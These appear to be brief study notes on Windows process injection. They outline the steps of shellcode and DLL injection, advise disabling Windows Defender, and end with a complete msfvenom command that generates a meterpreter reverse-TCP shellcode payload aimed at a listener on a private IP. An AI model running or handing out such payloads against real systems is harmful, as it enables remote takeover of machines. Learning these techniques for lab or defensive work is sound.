PROCESS injection
-Inject something we want to run into a target process(pID).
-Every process has a Process ID.
a. Shellcode injection
-Get a handle to our process
- Allocate memory to our shellcode
- Write to the process memory
- Create remote thread
b. DLL injection
- Loading our own library to an existing process.


a) Shellcode
- Generate in kali linux.
- DIsable windows defender(for now).
kali> msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=443 EXITFUNC=thread -f c --var-name=payload
